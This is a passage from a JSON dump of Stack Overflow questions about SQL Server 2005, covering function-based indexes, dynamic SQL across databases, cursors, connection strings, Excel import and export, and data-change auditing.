by t0.id, t0.[description], t0.lastchecked\n</code></pre>\n\n<p>Here is a link to the execute plan saved in XML:  <a href=\"http://codepaste.net/5xcpcw\" rel=\"nofollow\">http://codepaste.net/5xcpcw</a>\nHere is a link to the table structure: <a href=\"http://codepaste.net/pnqx6e\" rel=\"nofollow\">http://codepaste.net/pnqx6e</a></p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":60,"score":3,"question_id":13014108,"title":"Function Based Index in SQL SERVER 2005","body":"<p>Please suppose you have a table called BEER_HERE, with two columns: </p>\n\n<pre><code>BEER_CODE VARCHAR(50)\nBEER_DATE DATETIME\n</code></pre>\n\n<p>Please suppose also you have the availability of a function called dbo.TRUNCATE_DATE which works as follows:</p>\n\n<pre><code>dbo.TRUNCATE_DATE ('23/12/2012 23:59:57.395') ==&gt; 23/12/2012 00:00:00.000\n</code></pre>\n\n<p>I would like to create a FUNCTION BASED INDEX on:</p>\n\n<pre><code>(BEER_CODE, dbo.TRUNCATE_DATE(BEER_DATE))\n</code></pre>\n\n<p>How could I achieve this?</p>\n\n<p>Thank you in advance for your kind help.</p>\n"},{"tags":["sql-server-2005","stored-procedures","cgi","pyodbc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":25,"score":1,"question_id":12978552,"title":"sp_addrolemember not working in Python","body":"<p>I am trying to add user permissions using this stored procedure:</p>\n\n<pre><code>exec sp_addrolemember db_datawriter, MYUSER\n</code></pre>\n\n<p>The database is MS SQL 2005 and within SQL Management Studio the stored procedure works correctly using my authorized windows login.</p>\n\n<p>I created a simple HTML CGI website with Python as the scripting language using pyodbc. I also created a local user 'dataviewer' login that I used when pyodbc connects that has the following server role permissions the same as my windows login:</p>\n\n<p><img src=\"http://i.stack.imgur.com/G8WPr.png\" alt=\"enter image description here\"></p>\n\n<p>On the website I echo back the sql command that Python used and copy and paste the exact command in SQL SMS and the stored procedure works correctly.  It seems as though there is a security conflict somewhere but not sure what is happening becasue my windows login has the same server roles permission as the dataviewer login.</p>\n"},{"tags":["sql","sql-server-2005","table","multiple"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":13012032,"title":"Multiple Databases on the same SQL Server (MS SQL)","body":"<p>I have a SQL Server with about 100 databases on it. Most of the databases follow the same schema, for example, they have a table named dbo.Files.</p>\n\n<p>I want to write a query which will return me the UNIONed result of all the dbo.Files across all databases, but without specifically referencing the tables themselves (there are too many!). I've managed to create some dynamic SQL but this seems clunky and I need to develop it.</p>\n\n<pre><code>SELECT 'SELECT count(*) FROM ' + '[' + name + ']' + '.dbo.Files'    \nFROM master..sysdatabases   \n</code></pre>\n\n<p>The query should also account for the fact that not all of the databases have a dbo.Files table (and maybe output a line saying as much)</p>\n\n<p>Thanks for your help.</p>\n"},{"tags":["sql","sql-server","database","tsql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":7,"view_count":100,"score":-7,"question_id":13005484,"title":"Find missing number in table in SQL Server 2005","body":"<p>I have int datatype  column as No, and want to find those No number which are missing in table.</p>\n\n<p>For example: 1,2,3,7,8,9</p>\n\n<p>Ans = 4,5,6</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","cursor"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12999239,"title":"Quering current cursor row - without selecting into variables","body":"<p>I'm using a cursor to iterate through dynamic SQL query result set. I'm fully aware that both cursors and dynamic SQL are dubious methods which best be avoided. Please do not address this topics.</p>\n\n<p>I'm fetching entire row in each iteration (and not several columns into corresponding variables). Why? because later on I need to address a dynamically changing column names. But again - that is not the matter on hand.</p>\n\n<p>Is there a way to query the current row? I have failed to do so, so far. For example, this pseudo-code \"supposed\" to do the job (return the <code>ABCD</code> column value for the current row).</p>\n\n<pre><code>SELECT [ABCD] FROM Rows_CURSOR\n</code></pre>\n\n<p>I would appreciate any useful suggestions [just saying \"do not use cursors\" is not a useful comment ;) ].</p>\n\n<p>Thank you in advance.</p>\n"},{"tags":["sql-server","sql-server-2005","iis7","asp-classic","adodb"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":101,"score":1,"question_id":12988879,"title":"Error with classic asp database connection after migration of website from IIS6 to IIS7","body":"<p>I have a classic asp site which has the following database connection:</p>\n\n<pre><code>&lt;%\nset objConnection = Server.CreateObject(\"ADODB.Connection\")\nobjConnection.ConnectionString = \"Driver={SQL Server};Server=123.456.789.012;Database=mydatabase;Uid=myuser;Pwd=123xyz;\"\nobjConnection.Open\n%&gt;\n</code></pre>\n\n<p>The site has just been moved from a Windows 2003 server running IIS6 to a Windows 2008 server running IIS7 (both using MSSQL 2005 Express database) and it now gives an error message:</p>\n\n<pre><code>Microsoft OLE DB Provider for ODBC Drivers error '80004005'\n[Microsoft][ODBC SQL Server Driver][DBNETLIB]Invalid connection.\n/inc/dbconnection.asp, line 4 \n</code></pre>\n\n<p>I'm assuming it's because there's a different driver with IIS7?  What would be the updated connection string to get this to work - I've googled and just not found anything that works or makes sense to me (I'm at the edge of my understanding here to be honest!)?</p>\n\n<p>Many thanks for any pointers folks...</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":13007313,"title":"Writing update Query for updating a column based on certain conditions","body":"<p>I had written a query like this.</p>\n\n<pre><code>Update Dynamic_Grid \nset TRIAL=(Select Trial from TEMP) \nwhere UsrCode='ll1' \nand ColumnName=(Select ColumnName from TEMP)\n</code></pre>\n\n<p>It is throwing error. Can anyone please try to correct it?</p>\n"},{"tags":["asp.net",".net","performance","sql-server-2005"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":13007716,"title":"Performance of web application .net 2.0","body":"<p>I have just started working over a website written in .net 2.0. Pages take long to load and response time is quite low, not sure where to start from in order to improve performance of the same.</p>\n\n<p>Hardware is not a problem as there is enough memory and processor is also good enough.</p>\n\n<p>Any Idea where should I start from and to improve the performance.</p>\n"},{"tags":["sql-server-2005","sql-server-2008","maintenance"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1036,"score":1,"question_id":3184286,"title":"How to create maintenance plan in sql server?","body":"<p>when i m trying to create new maintenance plan in sql server it is popping up this error-</p>\n\n<pre><code>TITLE: Microsoft SQL Server Management Studio\n------------------------------\n\n'Agent XPs' component is turned off as part of the security configuration for \nthis server. A system administrator can enable the use of 'Agent XPs' by using   sp_configure. \nFor more information about enabling 'Agent XPs', see \"Surface Area   Configuration\" in \nSQL Server Books Online. (ObjectExplorer)  \n</code></pre>\n"},{"tags":["vb.net","sql-server-2005","where-clause"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":13007787,"title":"how to use multiple columns in where clause in sql server 2005?","body":"<p>I want to search ID of employee by his name. so I have taken a textbox to enter his name and a search button. The ID and name of employee is stored in Employee table but the name is stored in 3 columns ie firstname, middlename and lastname.\n  So my problem is how to write query for searching ID as i will have to use the above mentioned 3 columns to compare the name with the name entered in the textbox.</p>\n\n<p>Please help me out with this.\nthanks in advance.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":32,"score":1,"question_id":12977754,"title":"How to detect ranges of IDs with the same number of records inside them","body":"<p>In a SQL SERVER 2005 database, please suppose we have a table called RUNNING_COLA_IS_AFRICA.</p>\n\n<p>This table has a unique varchar(50) field called RUNNING_ID.</p>\n\n<p>We have 1 million records in this table.</p>\n\n<p>I would like to write a query that, sorting by RUNNING_ID ASC, and stating a range of 50, produces an output similar to the following:</p>\n\n<pre><code>RUNNING_ID_START RUNNING_ID_END\n000000           000103\n000104           000767\n000892           001492\n001576           011222\n012345           013579\n</code></pre>\n\n<p>This means that:</p>\n\n<pre><code>a) The number of the records between 000000 and 000103 is 50;\nb) The number of the records between 000104 and 000767 is 50;\nc) The number of the records between 000892 and 001492 is 50;\nd) The number of the records between 001576 and 011222 is 50;\ne) The number of the records between 012345 and 013579 is &lt;= 50.\n</code></pre>\n\n<p>Of course, min(RUNNING_ID) = 000000 and max(RUNNING_ID) = 013579 because they are ordered by RUNNING_ID ASC.</p>\n\n<p>How could I achieve this in SQL SERVER 2005?</p>\n\n<p>Thank you in advance for your kind help.</p>\n"},{"tags":["visual-studio-2010","sql-server-2005","reporting"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":789,"score":3,"question_id":7105848,"title":"Use MS SQL Server 2005 Reporting Services with Visual Studio 2010","body":"<p>While writing this question I had a simple idea which fixed the issue. Maybe other people have the same problem or you would like to comment this so I'm posting it anyways.</p>\n\n<p>tldr/simplified question:\nHow do i use MS SQL Server 2005 Reporting Services in Visual Studio 2010?</p>\n\n<p>Solution:\nJust copy the Visual Studio 2008 Reporting DLLs in your project and include them as references. I guess you have to own a licence for vss2008 when doing this but technically this solves the issue.</p>\n\n<p>Original question:</p>\n\n<blockquote>\n  <p>How can i use MS SQL Server 2005 Reporting Services in Visual Studio\n  2010? The reason i ask this is the following: We migrated to\n  VSS 2010 as our IDE but are still using MS SQL Server 2005.</p>\n  \n  <p>Now, i want to change a piece of code in a Project which makes use of\n  Reporting Services on said SQL Server. </p>\n  \n  <p>After converting the Solution to a VSS2010 Solution I get BuildErrors\n  because it can't find the namespaces \"ReportViewer\" and \"Reporting\".\n  That's because the references to</p>\n  \n  <ul>\n  <li>Microsoft.ReportViewer.Common (9.0.0.0)</li>\n  <li>Micrsofot.ReportViewer.WinForms (9.0.0.0)</li>\n  </ul>\n  \n  <p>Are no longer resolvable. So i have to replace them with the\n  references to the same Assemblies in Version 10.0.0.0.</p>\n  \n  <p>After doing that the Solution builds successfully, but when opening\n  the ReportViewer i get an SoapVersionMismatchException telling me that\n  for Remote-Processing i have to use Microsoft SQL Server 2008\n  Reporting Services or higher.</p>\n</blockquote>\n"},{"tags":["sql","sql-server-2005","localhost"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":2817,"score":2,"question_id":10624287,"title":"Cant connect to SQL Server 2005 localhost","body":"<p>I've been trying to connect to SQL Server 2005 on my localhost and I can not connect...</p>\n\n<blockquote>\n  <p>Server name: (local)\\SQLEXPRESS <br>Authentication: Windows\n  Authentication</p>\n</blockquote>\n\n<p>other Server name I have tried are</p>\n\n<blockquote>\n  <p>LOCALHOST\\SQLEXPRESS<br> \n  (local)\\my local hostname</p>\n</blockquote>\n\n<p>I get this error message:</p>\n\n<blockquote>\n  <p>Cannot connect to 127.0.0.1\\SQLEXPRESS.<br> A network-related or\n  instance-specific error occurred while establishing a connection to\n  SQL Server. The server was not found or was not accessible. Verify\n  that the instance name is correct and that SQL Server is configured to\n  allow remote connections.</p>\n</blockquote>\n\n<p>SQL Server Browser is turned on in Services</p>\n\n<p>any ideas?</p>\n"},{"tags":["sql","sql-server-2005","ssms"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":40,"score":0,"question_id":13006857,"title":"Create view and use it in a single SQL script","body":"<p>Simple thing ... i thought. Create a view and use it later in the same SQL script.\nLet's say we have a script as follows:</p>\n\n<pre><code>CREATE VIEW someView AS (...)\nDROP VIEW someView\n</code></pre>\n\n<p>If I try to parse it SQL Management complaints there's an error around DROP.\nIf I execute them separately (create first, then drop) they work both fine.\nIs there any way to create a view and use it in a single SQL script?\nI could wrap further statements in string an then EXEC it but it's a bit inconvenient.</p>\n\n<p><strong>Code example was fixed (missing VIEW)</strong></p>\n\n<p>More meaningful example:</p>\n\n<pre><code>create view TEST as (select name from spt_values where number=1);\ndrop view TEST\n</code></pre>\n\n<p>Is it possible to execute it at once? \nI got the error:</p>\n\n<pre><code>Msg 156, Level 15, State 1, Procedure TEST, Line 2\nIncorrect syntax near the keyword 'drop'.\n</code></pre>\n\n<p>Running create statement separately and then dropping view works perfectly.</p>\n"},{"tags":["vb.net","sql-server-2005","data-import"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13006962,"title":"VB.NET code to import Excel data into SQL Server 2005","body":"<p>I have a problem when I imported data from Excel into SQL Server </p>\n\n<p>Return only one row from Excel although the Excel has more than 3000 rows </p>\n\n<p>I wrote this code : </p>\n\n<pre><code>Try\n        Dim ss As Integer\n        Dim myfile As String = \"D:\\acct_data.xls\"\n        Dim excelconnectionstring As String = \"Provider=Microsoft.ACE.OLEDB.12.0;Data Source=\" &amp;          myfile &amp; \";Extended Properties=\"\"Excel 12.0;HDR=Yes;\"\"\"\n        Using connectin As New System.Data.OleDb.OleDbConnection(excelconnectionstring)\n            connectin.Open()\n            Dim command As New System.Data.OleDb.OleDbCommand(\"select * from [Sheet1$]\", connectin)\n            Using dr As System.Data.OleDb.OleDbDataReader = command.ExecuteReader\n                While dr.Read\n                    If dr.HasRows Then\n                        ss = CInt(dr.Item(\"rim_no\"))\n                        MessageBox.Show(ss)\n                    End If\n                End While\n\n            End Using\n        End Using\n\n    Catch ex As Exception\n\n    End Try\n</code></pre>\n"},{"tags":["sql","sql-server-2005","netezza"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":89,"score":-2,"question_id":12939227,"title":"Find column Value by dividing with sum of a column","body":"<p>I have a table with the following columns in a Netezza Database</p>\n\n<pre><code>Id  field1  field2      \n 1   0.9    sum(field1)/0.9\n 2   1.7    sum(field1)/1.7\n 3   6.9    sum(field1)/6.9\n 4   0.4    sum(field1)/0.4\n 5   0.2    sum(field1)/0.2\n 6   2.8    sum(field1)/2.8\n 7   7.0    sum(field1)/7.0\n</code></pre>\n\n<p>The <code>field2</code> column is to be generated and will hold values as shown in the table.</p>\n\n<p>For this example the sum of <code>field1</code> is <code>19.9</code>.</p>\n\n<p>Also the <code>field1</code> values will change frequently.</p>\n\n<p>Please help with  a query that will help calculate the <code>field2</code> value also the values are in decimals so will want the precise sum.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","remedy"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":713,"score":0,"question_id":7650421,"title":"Converting a BMC Remedy timestamp to mm/dd/yyyy format","body":"<p>According to the documentation I've found from AR Systems on BMC Remedy, timestamps in an MSSQL Server environment (we're using SQL Server 2005 here) are stored as an <strong>int</strong> datatype in UNIX timestamp format.</p>\n\n<p>I cannot for the life of me get custom SQL in Business Objects Web Intelligence to let me convert this timestamp into mm/dd/yyyy format, which I need to be able to group records by a date (without the timestamp, obviously). Anything I try to do involving math or datatype conversion throws an \"invalid type\" error. I can't convert the field to an int, varchar, datetime, or anything else. The only function that works is DATEADD, which still returns the full timestamp.</p>\n\n<p>How can I get this converted? I'm going nuts here!</p>\n"},{"tags":["sql-server-2005","datetime","stored-procedures","datepart"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13001293,"title":"copy first cell to second then add hours as int (DATEPART)","body":"<p>I have data in the table like the following. </p>\n\n<pre><code>TimeIn                   TimeOut           \n-------------------------------------\n6/1/2010 09:00:00   Null     \n6/2/2010 09:00:00   6/2/2010 16:45:00       \n6/3/2010 10:05:00   Null                    \n6/4/2010 07:30:00   6/4/2010 15:45:00    \n</code></pre>\n\n<p>i have the stored procedure to find last activity with \"not signd out\" column</p>\n\n<p>i have a stored procedure for copy a cell to other too ...</p>\n\n<p>then, what i need,  is to update [TimeOut] (if there's no time out)</p>\n\n<p>via more elegant way like </p>\n\n<p><code>UPDATE TimeOut SET DATEPART(HOUR, TimeOut) = DATEPART(HOUR, TimeIN) + 8</code></p>\n\n<p>so the Whole idea was to \nfirst check if last activity - Timeout Column is null</p>\n\n<p>then if it is, sign TimeOut with max work hours allowed (8).</p>\n\n<p>is there a simple way to do it ?</p>\n\n<h2>UPDATE</h2>\n\n<p>as to marc answer , this is the selection of find out if user didn't sign out</p>\n\n<pre><code>SELECT CASE WHEN [TimeOut] IS NULL THEN '' ELSE CONVERT(NVARCHAR,[TimeOut]) END FROM tblTime WHERE tId = ( SELECT MAX(tId) FROM tblTime WHERE UserId = 123\n</code></pre>\n\n<p>so i have the query that finds who did not sign out at last activity</p>\n\n<p>then i only need to update that specific Row - field <code>TimeOut</code></p>\n\n<p>with hours of time in + 8 \nthat was my question</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":63,"score":2,"question_id":12993853,"title":"Join the table valued function in the query","body":"<p>I have one table vwuser. I want join this table with the table valued function fnuserrank(userID). So I need to cross apply with table valued function:</p>\n\n<pre><code>SELECT *\nFROM vwuser AS a\nCROSS APPLY fnuserrank(a.userid)\n</code></pre>\n\n<p>For each userID it generates multiple records. I only want the last record for each empid that does not have a Rank of Term(inated).  How can I do this?</p>\n\n<p>Data:</p>\n\n<pre>\nHistoryID empid  Rank  MonitorDate\n1          A1     E1    2012-8-9\n2          A1     E2    2012-9-12 \n3          A1     Term  2012-10-13\n4          A2     E3     2011-10-09\n5          A2     TERM   2012-11-9 \n</pre>\n\n<p>From this 2nd record and 4th record must be selected.</p>\n"},{"tags":["sql-server-2005","null","case"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":6469201,"title":"SQL Server 2005 Selecting last know good data","body":"<p>I have a situation where we collect capacity information in a table, but sometimes are data collections fail and no data is present for that day. I am trying to devise a way to check when a day is NULL, and then go back and get the <code>MAX(Date)</code> with good data. I know I am not providing a lot of information, but I have an idea to do it with a CASE statement, but I wanted to see if there were other ideas that I might not have thought of.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12984088,"title":"sql - max from group flag setter","body":"<p>I m trying to achieve flag setting for the condition in my table below</p>\n\n<pre><code>p_id      mon_year      e_id     flag  \n----      ---------     -----    -----\n 1          2011/11       20       0\n 1          2011/11       21       1\n 1          2012/01       22       1\n 1          2012/02       23       0\n 1          2012/02       24       0\n 1          2012/02       25       1\n 2          2011/11       28       0\n 2          2011/11       29       1\n 2          2012/01       30       1\n</code></pre>\n\n<p>grouping by p_id,e_id and mon_year, the flag is set for the last value in the month.</p>\n\n<p>I m confused how can i achieve this</p>\n\n<p>I tried to achieved this by using row_number and partition to seperate out the value. By still looking for to achieved</p>\n\n<p>Output by using row_number query , i have got is as below:</p>\n\n<p>Grouping by </p>\n\n<pre><code>p_id      mon_year      e_id     row\n----      ---------     -----    -----\n 1          2011/11       20       1\n 1          2011/11       21       2\n 1          2012/01       22       1\n 1          2012/02       23       1\n 1          2012/02       24       2\n 1          2012/02       25       3\n 2          2011/11       28       1\n 2          2011/11       29       2\n 2          2012/01       30       1\n</code></pre>\n\n<p>Max of this value would set the flag column. But i m really bugged how to achieve it. Any help would be useful.</p>\n\n<p>Thanks !!</p>\n"},{"tags":["php","sql-server-2005","sql-server-2008"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":927,"score":3,"question_id":1471723,"title":"PHP - SQL Server 2005 express to 2008 standard problem","body":"<p>I have a PHP app running happily on the following system:</p>\n\n<ul>\n<li>web app: PHP version 5.2.3 </li>\n<li>OS: Windows Server 2003 Standard 32 bit </li>\n<li>database: SQL Server 2005 (express)</li>\n<li>web server: IIS 6</li>\n</ul>\n\n<p>I'm trying to get the same thing running on the following:</p>\n\n<ul>\n<li>web app: PHP version 5.2.11</li>\n<li>OS: Windows Server 2008 Standard 64 bit</li>\n<li>database: SQL Server 2008 Standard 64-bit</li>\n<li>web server: IIS 7</li>\n</ul>\n\n<p>After doing the install and setup I usually do, phpinfo() is running but there is no MSSQL section. I've looked around and found some MS documentation to set up the system using a <code>php_sqlsrv.dll</code> and tried that but it seems to use a different interface to connect to the database (no more <code>mssql_connect()</code>, now it's <code>sqlsrv_connect()</code>). Is this the only way to connect php to SQL Server 2008 or do I just have the setup wrong? If I can go back to PHP 5.2.3 and have it work, that will be fine but I didn't want to undo what I have if it won't help.</p>\n\n<p>Thanks,</p>\n"},{"tags":["c#","file","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":40,"score":-3,"question_id":12996371,"title":"How to add a file to a table in MS SQL Server","body":"<p>As the title, Now I have a table to save data, type of data is file. But I don't know how to do that.\nWho can help me ?</p>\n\n<p>I'm using C# (VS 2010, MS SQL Express 2005).</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","sql-server-2005","export-to-excel","openrowset"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1137,"score":0,"question_id":9640523,"title":"SQL Server 2005 into Excel with OPENROWSET MSG 7399/7303","body":"<p>My patience is at an end with this issue. I run jobs via SSMS or the agent that have been working perfectly fine up until last week that insert data from tables/views into various Excel files.</p>\n\n<p>Most recently, the jobs/code just keep running while never finishing...these jobs use to only take up-to 15-25 seconds to complete but now never end. I've tested the code below on a new sheet and it goes instantaneously! The error I'm getting also doesn't help, the solutions I've found in Google were no help or were already set.</p>\n\n<p>Any ideas what would cause a openrowset export to just bomb out and not do its job?</p>\n\n<p>Code I generally run that works:</p>\n\n<pre><code>INSERT INTO OPENROWSET('Microsoft.ACE.OLEDB.12.0',\n'Excel 12.0;HDR=YES;Database=C:\\Automation\\DYNAMIC\\Output\\File.xlsx;',\n'SELECT * FROM [Data$]')\n\nSELECT *\nFROM [REPORTING].[dbo].[tbl_table]\n</code></pre>\n\n<p>The current error message:</p>\n\n<blockquote>\n  <p>Msg 7399, Level 16, State 1, Line 1<br>\n  The OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"(null)\" reported an error. The provider did not give any information\n  about the error.<br>\n  Msg 7303, Level 16, State 1, Line 1<br>\n  Cannot initialize the data source object of OLE DB provider \"Microsoft.ACE.OLEDB.12.0\" for linked server \"(null)\".</p>\n</blockquote>\n\n<p>System:</p>\n\n<ul>\n<li>SQL Server 2005 32-Bit on Windows XP 32-Bit</li>\n</ul>\n\n<p>Updated/Edited information:</p>\n\n<ul>\n<li><p>Excel sheets contain either functions on a separate tab or Charts extrapolating the data from the [Data$] tab (if any of this helps)</p></li>\n<li><p>I have created a brand new worksheet and tested my insert query and it worked perfectly</p></li>\n<li><p>The source file was not originally created on the server, but instead transferred via Share Drive (I don't think this would matter though)</p></li>\n</ul>\n\n<p>Any help is appreciated!!</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":45,"score":0,"question_id":12994735,"title":"add series (row?) number to end of existing column data","body":"<p>I have a large table with a column that contains the same string data \"Dummy\".\nI need to add a sequential count to the end of that string to make it unique.  IE:</p>\n\n<pre><code>Dummy1\nDummy2\nDummy3 \n</code></pre>\n\n<p>For the life of me I cannot get this right.  I do not want a new column, and I do not want a new table.</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":285,"score":2,"question_id":3343756,"title":"UPDATE column from another column two tables away","body":"<p>Not that good with SQL yet but I'm learning.</p>\n\n<p>So I have 3 tables:</p>\n\n<p>tblOne(Id, Type)\ntblTemp1(Name, Type)\ntblTemp2(Id, Name)</p>\n\n<p>Basically, I want to update tblOne where the where it's 'Id' matches from tblTemp2, but than that also goes and grabs its 'Type' from tblTemp1 where the 'Name' matches.</p>\n\n<p>Can anyone help?</p>\n"},{"tags":["php","sql-server","sql-server-2005","sql-server-2005-express"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":169,"score":0,"question_id":8228494,"title":"windows 7, php 5.3, when fetching binary data with sqlsrv from mssql the data is doubled","body":"<p>ok, so I have images on a MSSQL 2005 (express) server which I want to write to files.\nwith the same piece of code, on linux it works fine, on windows it writes the data twice in the file</p>\n\n<pre><code>file_put_contents($file, $val);\n$val = basename($file);\n</code></pre>\n\n<p>I know it is not a file_put_contents() problem because I also tried with fwrite\nthe output file in windows has double the size it has in linux</p>\n\n<pre><code>-rw-rw-r-- 1 dimitris dimitris  891768 2011-11-22 16:13 eshop_products__2201.jpg\n-rw-rw-r-- 1 dimitris dimitris  445884 2011-11-21 19:15 eshop_products__2201_linux.jpg\n</code></pre>\n\n<p>I am using the freetds driver for linux and php_pdo_sqlsrv_53_nts_vc9 in windows</p>\n\n<p>any ideas on something I could do to get the correct data in windows? maybe some configuration I missed?</p>\n\n<p>topmost bytes of each file:</p>\n\n<p>windows file:</p>\n\n<pre><code>ASCII (php substr):\nFFD8FFE000104A46494600010100000100010000FFDB0043000302020302020303030304030304050805050404050A070706080C0...etc...\n\nhex:\n00000000:  46 46 44 38 46 46 45 30  30 30 31 30 34 41 34 36  FFD8FFE000104A46\n00000010:  34 39 34 36 30 30 30 31  30 31 30 30 30 30 30 31  4946000101000001\n00000020:  30 30 30 31 30 30 30 30  46 46 44 42 30 30 34 33  00010000FFDB0043\n00000030:  30 30 30 33 30 32 30 32  30 33 30 32 30 32 30 33  0003020203020203\n00000040:  30 33 30 33 30 33 30 34  30 33 30 33 30 34 30 35  0303030403030405\n00000050:  30 38 30 35 30 35 30 34  30 34 30 35 30 41 30 37  0805050404050A07\n00000060:  30 37 30 36 30 38 30 43  30 41 30 43 30 43 30 42  0706080C0A0C0C0B\n</code></pre>\n\n<p>linux file:</p>\n\n<pre><code>ASCII (php substr):\n����JFIF��C\n\nhex:\n00000000:  ff d8 ff e0 00 10 4a 46  49 46 00 01 01 00 00 01  ......JFIF......\n00000010:  00 01 00 00 ff db 00 43  00 03 02 02 03 02 02 03  .......C........\n00000020:  03 03 03 04 03 03 04 05  08 05 05 04 04 05 0a 07  ................\n00000030:  07 06 08 0c 0a 0c 0c 0b  0a 0b 0b 0d 0e 12 10 0d  ................\n00000040:  0e 11 0e 0b 0b 10 16 10  11 13 14 15 15 15 0c 0f  ................\n00000050:  17 18 16 14 18 12 14 15  14 ff db 00 43 01 03 04  ............C...\n00000060:  04 05 04 05 09 05 05 09  14 0d 0b 0d 14 14 14 14  ................\n00000070:  14 14 14 14 14 14 14 14  14 14 14 14 14 14 14 14  ................\n</code></pre>\n\n<p>The code extracting the file from the database is base on the yii framework, using yii's commands feature (php cli)</p>\n\n<p>Connection strings:</p>\n\n<p>linux</p>\n\n<pre><code>'connectionString' =&gt; 'dblib:host=192.168.56.101;port=1433;dbname=mssqldb',\n</code></pre>\n\n<p>windows</p>\n\n<pre><code>'connectionString' =&gt; 'sqlsrv:Server=192.168.56.101;Database=mssqldb',\n</code></pre>\n\n<p>Code:</p>\n\n<pre><code>$rows = $this-&gt;db-&gt;createCommand(\"SELECT * FROM $viewName WHERE 1=1\")-&gt;queryAll();\n\n/*\n * Convert charset and extract photos from view\n */\nforeach ($rows as $row) {\n    // convert charset / export photos\n    foreach ($row as $key =&gt; &amp;$val) {\n        // charset conversion, on fields that do not contain photos\n        // $viewCfg is an array I maintain to know which field does what\n        if (empty($viewCfg['photos']) || !in_array($key, $viewCfg['photos'])) {\n            $val = @iconv(\"Windows-1253\", \"UTF-8\", $val);\n        // grab image in file\n        } else {\n            $id = '';\n            foreach ($viewCfg['keys'] as $fieldName) {\n                $id .= '_' . $row[$fieldName];\n            }\n\n            $file = Yii::app()-&gt;params['pathPhotos'] . '/' . $viewName . '_' . $id . '.jpg';\n\n            if ($val) {\n                if (file_exists($file) &amp;&amp; (file_get_contents($file)!=$val))\n                    unlink($file);\n\n                file_put_contents($file, $val);\n                $val = basename($file);\n            }\n        }\n    }\n// ... do the rest\n</code></pre>\n"},{"tags":["sql","sql-server-2005","select"],"answer_count":8,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1870,"score":0,"question_id":5340064,"title":"Select 2 columns in one","body":"<p>Is it possible to select 2 columns in just one?</p>\n\n<p>Example: </p>\n\n<p>select something + somethingElse as onlyOneColumn from someTable</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008"],"answer_count":3,"favorite_count":6,"up_vote_count":6,"down_vote_count":0,"view_count":2860,"score":6,"question_id":793643,"title":"Auditing SQL Server data changes","body":"<p>I'm looking at changing our Auditing process for our SQL Server 2005 databases and I came across Change Data Capture in SQL Server 2008. </p>\n\n<p>This looks like a good idea, and I'm tempted to try it, but before I do has anyone used it in a commercial environment and what are your thoughts?</p>\n\n<p>I noticed when I was reading about CDC in the MS help, it said that audit data would usually be kept for a couple of days. That's not possible here, I'd like to keep the data indefinitely, does anyone know of problems with this approach?</p>\n\n<p>If this isn't a good solution for reasons I'm unaware of, have you any other solutions for  auditing of data changes. I'm keen to use a system that can be implemented across the board on any tables I desire.</p>\n\n<p>I'm after the basic: \"Before, After, Who By, When\" information for any changes.</p>\n"},{"tags":["sql-server","database","sql-server-2005","mirroring","transaction-log"],"answer_count":10,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":6815,"score":0,"question_id":1033158,"title":"Shrinking the transaction log of a mirrored SQL Server 2005 database","body":"<p>I've been looking all over the internet and I can't find an acceptable solution to my problem, I'm wondering if there even is a solution without a compromise...</p>\n\n<p>I'm not a DBA, but I'm a one man team working on a huge web site with no extra funding for extra bodies, so I'm doing the best I can.</p>\n\n<p>Our backup plan sucks, and I'm having a 